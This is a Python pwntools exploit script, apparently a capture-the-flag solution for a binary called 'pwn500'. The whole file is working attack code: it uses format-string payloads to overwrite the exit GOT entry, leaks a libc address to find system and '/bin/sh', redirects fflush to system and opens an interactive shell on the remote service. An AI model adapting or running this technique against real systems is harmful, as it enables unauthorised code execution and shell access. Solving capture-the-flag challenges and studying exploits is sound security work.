#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

context.arch = 'i386'
context.log_level = 'debug'
if len(sys.argv) > 1:
    r = remote('', )
else:
    r = remote('127.0.0.1', 4444)

offset_system = 0x0003a940
offset_dup2 = 0x000d4b50
offset_read = 0x000d4350
offset_write = 0x000d43c0
offset_str_bin_sh = 0x15900b

code = ELF('./pwn500')
exit_got = code.got['exit']
printf_got = code.got['printf']
main = 0x80485D2
p = fmtstr_payload(7, {exit_got: main}, 0, 'byte')
p += '%83$p'
r.sendline(p)
libc_start_main = int(r.recvuntil('sooo')[-12:-4], 16) - 247
libc_addr = libc_start_main - 0x18540

system = libc_addr + offset_system
#print hex(printf_got)
#print hex(system)
sh = libc_addr + offset_str_bin_sh 
#one = libc_addr + 392133 #392134
#p = fmtstr_payload(7, {exit_got: one}, 0, 'byte')
p = fmtstr_payload(7, {code.got['fflush']: system, 0x804A060: sh}, 0, 'byte')
r.sendline(p)
r.interactive()
